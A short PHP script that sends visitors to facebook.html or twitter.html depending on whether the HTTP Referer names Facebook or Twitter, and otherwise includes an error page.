<?php
$ref = $_SERVER['HTTP_REFERER'];


if (strpos($ref, "facebook"))	{ header('Location: facebook.html'); }
if (strpos($ref, "twitter"))	{ header('Location: twitter.html'); }

require('error.php');

?>
